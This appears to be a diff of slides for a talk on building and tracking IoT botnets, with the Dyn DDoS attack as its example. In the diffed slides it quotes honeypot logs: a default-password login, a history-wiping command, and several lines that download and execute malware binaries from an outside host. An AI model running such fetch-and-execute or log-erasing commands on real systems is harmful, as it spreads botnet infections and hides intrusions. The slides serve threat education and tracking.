@@ -7,15 +7,17 @@
 * How to build a IoT botnet yourself and how to track one
 * Why black- and whitehat hackers love cat pictures?
 
-#HSLIDE?image=media/DNS_no_response.png
+#HSLIDE
+
+![Error](media/DNS_no_response.png)
 
 #VSLIDE
 
-> Early Friday morning, Dyn, a company that provides Domain Name Servers (DNS) for a 
-> lot of heavily trafficked websites and services, came under a massive Distributed 
-> Denial of Service (DDoS) attack. This has disrupted access to many sites for people 
-> across the U.S. Yes, it’s why your Spotify app is offline, why you can’t stream Netflix, 
-> and why Twitter won’t load. 
+Early Friday morning, __Dyn__, a company that provides __Domain Name Servers (DNS)__ for a 
+lot of heavily trafficked websites and services, came under a __massive Distributed 
+Denial of Service (DDoS)__ attack. This has disrupted access to many sites for people 
+across the U.S. Yes, it’s why your __Spotify__ app is offline, why you can’t stream __Netflix__, 
+and why __Twitter__ won’t load. 
 
 #HSLIDE
 
@@ -64,7 +66,7 @@ __... what about artificial cardiac pacemaker?__
 
 #HSLIDE
 
-```
+<pre>
 2016-10-28 05:00:46+0200 admin trying auth password
 2016-10-28 05:00:46+0200 login attempt [admin/qwerty] succeeded
 2016-10-28 05:00:49+0200 admin authenticated with password
@@ -76,11 +78,11 @@ rm -rf ./bash_history; history -c"
 2016-10-28 05:00:50+0200 Command found: history -c
 2016-10-28 05:00:50+0200 Closing TTY Log: log/tty/20161028-050050-abab97cc-0e.log after 0 seconds
 2016-10-28 05:00:50+0200 honeypot terminal protocol connection lost disconnected
-```
+</pre>
 
 #HSLIDE
 
-```
+<pre>
 cd /tmp && wget -q http://catsmeowalot.com/ayylmao && chmod +x ayylmao && ./ayylmao
 cd /tmp && wget -q http://catsmeowalot.com/ayymips && chmod +x ayymips && ./ayymips
 cd /tmp && wget -q http://catsmeowalot.com/jackmysh4 && chmod +x jackmysh4 && ./jackmysh4
@@ -91,7 +93,7 @@ cd /tmp && wget -q http://catsmeowalot.com/jackmypowerpc && chmod +x jackmypower
 cd /tmp && wget -q http://catsmeowalot.com/ayyi586 && chmod +x ayyi586 && ./ayyi586
 cd /tmp && wget -q http://catsmeowalot.com/jackmym86k && chmod +x jackmym86k && ./jackmym86k
 cd /tmp && wget -q http://catsmeowalot.com/jackmysparc && chmod +x jackmysparc && ./jackmysparc
-```
+</pre>
 
 #HSLIDE?image=media/
 
